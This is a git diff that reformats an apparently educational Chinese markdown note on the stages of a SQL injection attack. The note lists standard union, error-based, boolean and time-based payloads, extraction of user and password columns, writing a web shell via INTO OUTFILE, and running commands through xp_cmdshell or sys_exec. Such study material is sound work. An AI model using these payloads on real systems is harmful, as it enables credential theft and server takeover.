@@ -1,6 +1,6 @@
 # SQL注入完整攻击流程图
 
-```mermaid
+```
 graph TD
 A[开始] --> B{目标识别}
 B -->|Web应用| C[注入点探测]
@@ -58,62 +58,71 @@ style AE fill:#6f9,stroke:#090
 style AG fill:#f99,stroke:#c00
 ```
 
+![Snipaste_2025-04-19_12-51-46](./../../png/SQL%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/Snipaste_2025-04-19_12-51-46.png)
+
+![Snipaste_2025-04-19_12-52-13](./../../png/SQL%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/Snipaste_2025-04-19_12-52-13.png)
+
 ## 流程图说明
 
 1. **目标识别**：确定存在数据库交互的Web应用
 
 2. **注入点探测**：
 
-   - 测试URL参数/表单输入
-   - 添加`'`、`"`、`\`等特殊字符
+   测试URL参数/表单输入
+
+   添加`'`、`"`、`\`等特殊字符
 
 3. **错误判断**：
 
-   - 直接报错：快速确认注入类型
-   - 无报错：进入盲注检测流程
+   直接报错：快速确认注入类型
+
+   无报错：进入盲注检测流程
 
 4. **注入方式选择**：
 
-   - 联合查询注入（有回显）
+   联合查询注入（有回显）
 
-     ```sql
-     UNION SELECT 1,@@version,3
-     ```
+   ```sql
+   UNION SELECT 1,@@version,3
+   ```
 
-   - 报错注入（显示错误信息）
+   报错注入（显示错误信息）
 
-     ```sql
-     AND updatexml(1,concat(0x7e,version()),1)
-     ```
+   ```sql
+   AND updatexml(1,concat(0x7e,version()),1)
+   ```
 
-   - 布尔盲注（页面内容差异）
+   布尔盲注（页面内容差异）
 
-     ```sql
-     AND ascii(substr(database(),1,1))>100
-     ```
+   ```sql
+   AND ascii(substr(database(),1,1))>100
+   ```
 
-   - 时间盲注（响应延迟）
+   时间盲注（响应延迟）
 
-     ```sql
-     AND IF(1=1,SLEEP(5),0)
-     ```
+   ```sql
+   AND IF(1=1,SLEEP(5),0)
+   ```
 
 5. **信息收集阶段**：
 
-   - 获取数据库版本：`@@version`
-   - 列出数据库：`information_schema.schemata`
-   - 爆表名：`information_schema.tables`
-   - 爆列名：`information_schema.columns`
+   获取数据库版本：`@@version`
+
+   列出数据库：`information_schema.schemata`
+
+   爆表名：`information_schema.tables`
+
+   爆列名：`information_schema.columns`
 
 6. **数据提取**：
 
-   - 常规数据获取：
+   常规数据获取：
 
    ```sql
    UNION SELECT user,password FROM users
    ```
 
-   - 大段数据获取：
+   大段数据获取：
 
    ```sql
    #用于从服务器文件系统中读取指定文件的内容，并以字符串形式返回
@@ -122,24 +131,26 @@ style AG fill:#f99,stroke:#c00
 
 7. **权限提升**：
 
-   - 数据库写文件：
+   数据库写文件：
 
-     ```sql
-     #可以将查询结果写入服务器上的文件中
-     INTO OUTFILE '/var/www/shell.php'
-     ```
+   ```sql
+   #可以将查询结果写入服务器上的文件中
+   INTO OUTFILE '/var/www/shell.php'
+   ```
 
-   - 执行系统命令：
+   执行系统命令：
 
-     ```sql
-     #在 MySQL 中，默认情况下并不提供类似 MSSQL 的 xp_cmdshell 功能来直接执行系统命令。 可以通过安装用户自定义函数（UDF）来实现类似的功能。
-     MSSQL: xp_cmdshell('whoami')
-     #sys_exec() 是由第三方插件 lib_mysqludf_sys 提供的函数，允许在 MySQL 中执行系统命令
-     MySQL: sys_exec()
-     ```
+   ```sql
+   #在 MySQL 中，默认情况下并不提供类似 MSSQL 的 xp_cmdshell 功能来直接执行系统命令。 可以通过安装用户自定义函数（UDF）来实现类似的功能。
+   MSSQL: xp_cmdshell('whoami')
+   #sys_exec() 是由第三方插件 lib_mysqludf_sys 提供的函数，允许在 MySQL 中执行系统命令
+   MySQL: sys_exec()
+   ```
 
 8. **横向移动**：
 
-   - 内网扫描
-   - 密码爆破
-   - 漏洞利用
+   内网扫描
+   
+   密码爆破
+   
+   漏洞利用
